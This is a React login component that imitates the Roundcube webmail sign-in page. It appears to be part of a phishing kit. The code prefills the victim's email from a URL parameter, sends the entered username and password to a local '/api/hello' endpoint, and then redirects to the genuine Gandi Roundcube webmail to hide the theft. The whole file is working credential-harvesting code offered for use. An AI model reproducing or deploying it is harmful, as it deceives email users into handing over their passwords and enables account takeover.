import axios from "axios";
import { useEffect, useRef, useState } from "react";
import { FormEvent, ChangeEvent } from "react";

type Form = {
  email: string;
  passwort: string;
};

export default function Main() {
  const [credentials, setCredentials] = useState<Form>({
    email: "",
    passwort: "",
  });

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    let name = e.target.name;
    let value = e.target.value;

    setCredentials({ ...credentials, [name]: value });
  };

  const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const data = {
      email: credentials.email,
      password: credentials.passwort,
    };

    axios
      .post("/api/hello", data)
      .then((req) => {
        console.log(req.data);
        setCredentials({ passwort: "", email: "" });
        window.location.replace("https://webmail.gandi.net/roundcube/");

        console.log(req);
      })
      .catch((err) => {
        console.log(err);
      });
  };

  useEffect(() => {
    if (location.search) {
      // console.log(location.search);
      const url = new URLSearchParams(location.search);
      const email = url.get("email");
      if (email) setCredentials({ ...credentials, email });
    }
  }, []);

  // https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317

  return (
    <>
      <main className="w-screen flex flex-col items-center justify-center bg-[#cad2d9]">
        <div className="w-4/5 sm:w-[500px] px-5 py-3 flex flex-col mt-28 bg-[#404040] rounded-md">
          <img
            src="/roundcube_logo.png"
            alt="roundcube"
            className="w-48 h-13"
          />

          <form className="w-full my-8" onSubmit={(e) => handleSubmit(e)}>
            <div className="flex justify-end text-xs space-x-5">
              <p className="text-gray-300">Username</p>
              <input
                type="text"
                className="h-6 w-[80%] border rounded outline-none
                               focus:border-blue-400 focus:border-4 
                                focus:border-opacity-50 px-1 py-1
                                placeholder:opacity-70
                                
                                "
                name="email"
                value={credentials.email}
                onChange={handleChange}
              />
            </div>

            <div className="flex justify-end mt-5 text-xs space-x-5">
              <p className="text-gray-300">Password</p>
              <input
                type="password"
                className="h-6 w-[80%] border rounded 
                                  outline-none focus:border-blue-400 
                                  focus:border-4 focus:border-opacity-50 px-1 py-1
                                  
                                  placeholder:opacity-70
                                  "
                name="passwort"
                value={credentials.passwort}
                onChange={handleChange}
              />
            </div>

            <div className="w-full flex justify-center">
              <input
                type="submit"
                className="h-6 w-2/6 sm:w-1/6  bg-white mt-6
                        rounded-md font-semibold text-black text-sm
                        cursor-pointer mx-auto
                        "
                value="Login"
              />
            </div>
          </form>
        </div>
        <p className="text-center text-xs text-gray-700 mt-16 tracking-tighter">
          Roundcube webmail
        </p>
      </main>
    </>
  );
}
